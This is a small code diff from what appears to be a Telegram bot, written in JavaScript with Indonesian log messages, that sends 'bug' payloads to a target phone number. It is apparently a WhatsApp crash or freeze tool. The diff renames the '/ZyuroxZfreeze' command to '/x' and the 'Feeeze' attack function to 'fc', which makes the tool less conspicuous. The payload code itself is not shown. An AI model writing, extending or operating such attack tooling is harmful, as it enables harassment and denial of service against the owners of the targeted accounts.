@@ -1195,7 +1195,7 @@ if (remainingTime > 0) {
   }
 });
 
-bot.onText(/\/ZyuroxZfreeze (\d+)/, async (msg, match) => {
+bot.onText(/\/x (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const targetNumber = match[1];
@@ -1269,7 +1269,7 @@ if (remainingTime > 0) {
 
     // Eksekusi bug setelah progres selesai
     console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-    await Feeeze(jid);
+    await fc(jid);
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     // Update ke sukses + tombol cek target
